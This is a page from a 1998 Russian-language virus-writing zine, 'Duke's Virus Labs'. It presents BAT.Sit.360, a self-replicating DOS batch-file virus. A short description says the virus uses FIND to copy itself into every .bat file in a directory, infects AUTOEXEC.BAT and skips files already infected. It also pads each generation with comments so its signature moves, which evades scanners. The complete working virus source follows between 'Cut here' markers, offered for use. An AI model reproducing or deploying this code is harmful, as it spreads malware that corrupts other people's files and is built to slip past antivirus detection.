- [Duke's Virus Labs #3] - [Page 08] -

BAT.Sit.360
(c) by Duke/SMF

Имя вируса    : BAT.Sit.360
Автор         : Duke/SMF
Дата создания : 11.12.98

Этот вирус использует команду FIND для размножения и дописывается в конец
BAT-файлов. Поражает AUTOEXEC.BAT, но не размножается из него. 
Проверяет жертвы на повторное заражение.
Каждое новое поколение вируса по размеру превышает предыдущее на 20 байт
за счет добавления двух комментариев. Благодаря этому изменяется положение
основного тела вируса (то бишь его сигнатуры) относительно конца файла.

===== Cut here =====
@rem SiT
@echo off %SiT%
if "%0==" goto SiTe
if "%1=="SiT goto SiTa
echo.>SiT.bat
echo>>SiT.bat @rem SiT
find "SiT"<%0>>SiT.bat
echo>>SiT.bat @rem SiT
for %%b in (*.bat) do call SiT.bat SiT %%b
del SiT.bat>nul
goto SiTe
:SiT Dedicated to Irina by Duke/SMF
:SiTa
find "SiT"<%2>nul
if not errorlevel 1 goto SiTe
type SiT.bat>>%2
:SiTe
@rem SiT
===== Cut here =====